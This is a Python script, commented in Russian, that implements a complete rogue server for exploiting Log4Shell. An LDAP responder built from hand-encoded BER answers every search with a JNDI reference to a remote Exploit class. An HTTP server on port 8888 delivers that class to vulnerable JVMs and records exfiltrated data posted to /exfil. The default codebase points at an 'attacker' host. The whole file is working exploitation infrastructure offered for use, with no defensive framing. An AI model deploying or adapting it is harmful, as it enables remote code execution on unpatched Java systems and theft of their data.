#!/usr/bin/env python3
"""
Минимальный rogue-сервер для Log4Shell:
  * HTTP (8888) — отдаёт Exploit.class и принимает exfil (POST /exfil);
  * LDAP (1389) — на любой search отвечает JNDI-ссылкой на удалённый класс
    (javaCodeBase=HTTP, javaClassName=Exploit). При trustURLCodebase=true
    уязвимая JVM скачивает и загружает класс -> срабатывает static-блок -> RCE.
Только стандартная библиотека.
"""
import http.server
import os
import socketserver
import threading

ROGUE_DIR = os.path.dirname(os.path.abspath(__file__))
HTTP_PORT = 8888
LDAP_PORT = 1389
CODEBASE = os.environ.get("CODEBASE", "http://attacker:8888/")
CLASS = "Exploit"

# ---------- HTTP ----------
class HttpHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def do_GET(self):
        name = os.path.basename(self.path)
        path = os.path.join(ROGUE_DIR, name)
        if name.endswith(".class") and os.path.exists(path):
            data = open(path, "rb").read()
            self.send_response(200)
            self.send_header("Content-Type", "application/java-vm")
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)
            print(f"[HTTP] отдан {name} ({len(data)} b)", flush=True)
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        n = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(n)
        open(os.path.join(ROGUE_DIR, "exfil.out"), "ab").write(body)
        print("[EXFIL]\n" + body.decode("utf-8", "replace"), flush=True)
        self.send_response(200)
        self.end_headers()


def start_http():
    srv = http.server.ThreadingHTTPServer(("0.0.0.0", HTTP_PORT), HttpHandler)
    print(f"[*] HTTP слушает :{HTTP_PORT}", flush=True)
    srv.serve_forever()


# ---------- LDAP (ручной BER) ----------
def blen(n):
    if n < 128:
        return bytes([n])
    o = []
    while n:
        o.insert(0, n & 0xFF)
        n >>= 8
    return bytes([0x80 | len(o)]) + bytes(o)


def tlv(tag, val):
    return bytes([tag]) + blen(len(val)) + val


def octet(s):
    if isinstance(s, str):
        s = s.encode()
    return tlv(0x04, s)


def integer(v):
    b = bytearray()
    if v == 0:
        b.append(0)
    else:
        while v:
            b.insert(0, v & 0xFF)
            v >>= 8
        if b[0] & 0x80:
            b.insert(0, 0)
    return tlv(0x02, bytes(b))


def seq(val):
    return tlv(0x30, val)


def setof(val):
    return tlv(0x31, val)


def attr(name, value):
    return seq(octet(name) + setof(octet(value)))


def bind_response(msgid):
    body = bytes([0x0A, 0x01, 0x00]) + octet("") + octet("")   # success
    return seq(integer(msgid) + tlv(0x61, body))               # [APPLICATION 1]


def search_entry(msgid):
    attrs = (attr("objectClass", "javaNamingReference")
             + attr("javaClassName", CLASS)
             + attr("javaCodeBase", CODEBASE)
             + attr("javaFactory", CLASS))
    body = octet(CLASS) + seq(attrs)
    return seq(integer(msgid) + tlv(0x64, body))               # [APPLICATION 4]


def search_done(msgid):
    body = bytes([0x0A, 0x01, 0x00]) + octet("") + octet("")   # success
    return seq(integer(msgid) + tlv(0x65, body))               # [APPLICATION 5]


def parse(data):
    """Возвращает (messageID, protocolOpTag)."""
    i = 1
    l = data[i]
    i = i + 1 + (l & 0x7F) if (l & 0x80) else i + 1
    # messageID (INTEGER)
    ln = data[i + 1]
    mid = int.from_bytes(data[i + 2:i + 2 + ln], "big")
    i += 2 + ln
    return mid, data[i]


class LDAPHandler(socketserver.BaseRequestHandler):
    def handle(self):
        c = self.request
        try:
            while True:
                data = c.recv(8192)
                if not data:
                    break
                mid, op = parse(data)
                if op == 0x60:        # bindRequest
                    c.sendall(bind_response(mid))
                elif op == 0x63:      # searchRequest
                    print(f"[LDAP] search #{mid} -> отдаём ссылку на {CODEBASE}{CLASS}", flush=True)
                    c.sendall(search_entry(mid) + search_done(mid))
                elif op == 0x42:      # unbindRequest
                    break
        except Exception as e:
            print("[LDAP] err:", e, flush=True)


def start_ldap():
    socketserver.ThreadingTCPServer.allow_reuse_address = True
    srv = socketserver.ThreadingTCPServer(("0.0.0.0", LDAP_PORT), LDAPHandler)
    print(f"[*] LDAP слушает :{LDAP_PORT}", flush=True)
    srv.serve_forever()


if __name__ == "__main__":
    threading.Thread(target=start_http, daemon=True).start()
    start_ldap()
